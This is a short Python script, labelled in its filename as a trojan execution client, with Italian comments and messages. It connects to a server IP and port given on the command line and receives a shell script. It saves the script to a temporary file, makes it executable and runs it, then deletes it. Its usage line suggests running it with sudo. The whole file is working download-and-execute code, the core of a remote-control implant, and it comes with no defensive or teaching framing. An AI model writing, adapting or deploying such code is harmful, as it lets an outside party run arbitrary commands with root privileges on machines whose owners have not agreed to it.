# trojan_execution_client.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import sys
import subprocess
import tempfile
import os

def start_client(server_ip: str, server_port: int) -> None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            print(f"Tentativo di connessione a {server_ip} porta {server_port}...")
            sock.connect((server_ip, server_port))
            print("Connessione stabilita. Ricezione script...")

            # Riceve lo script dal server
            response_data = b''
            while True:
                data_chunk = sock.recv(4096)
                if not data_chunk:
                    break
                response_data += data_chunk
                if len(data_chunk) < 4096:
                    break

            script_content = response_data.decode('utf-8')

            if script_content.strip() == "SCRIPT_NOT_FOUND":
                print("Il server non ha fornito alcuno script.")
                return

            # Salva lo script in un file temporaneo
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".sh") as script_file:
                script_file.write(script_content)
                temp_script_path = script_file.name

            # Rende lo script eseguibile
            os.chmod(temp_script_path, 0o755)

            print(f"Eseguo lo script ricevuto ({temp_script_path})...\n")
            subprocess.run([temp_script_path], check=False)

            os.remove(temp_script_path)
            print("Script eseguito e rimosso.")

    except ConnectionRefusedError:
        print(f"Errore: Connessione rifiutata. Verifica che il server sia attivo su {server_ip}:{server_port}.")
    except socket.gaierror:
        print(f"Errore: Indirizzo IP non valido: '{server_ip}'")
    except socket.error as e:
        print(f"Errore di socket: {e}")
    except KeyboardInterrupt:
        print("\nClient interrotto dall'utente.")
    finally:
        print("Client terminato.")


def main():
    if len(sys.argv) != 3:
        print(f"Uso: sudo python3 {sys.argv[0]} <indirizzo_ip_server> <porta_server>")
        sys.exit(1)

    server_ip = sys.argv[1]
    try:
        server_port = int(sys.argv[2])
        if not 0 < server_port < 65536:
            raise ValueError
    except ValueError:
        print("Errore: La porta deve essere un numero intero compreso tra 1 e 65535.")
        sys.exit(1)

    start_client(server_ip, server_port)


if __name__ == "__main__":
    main()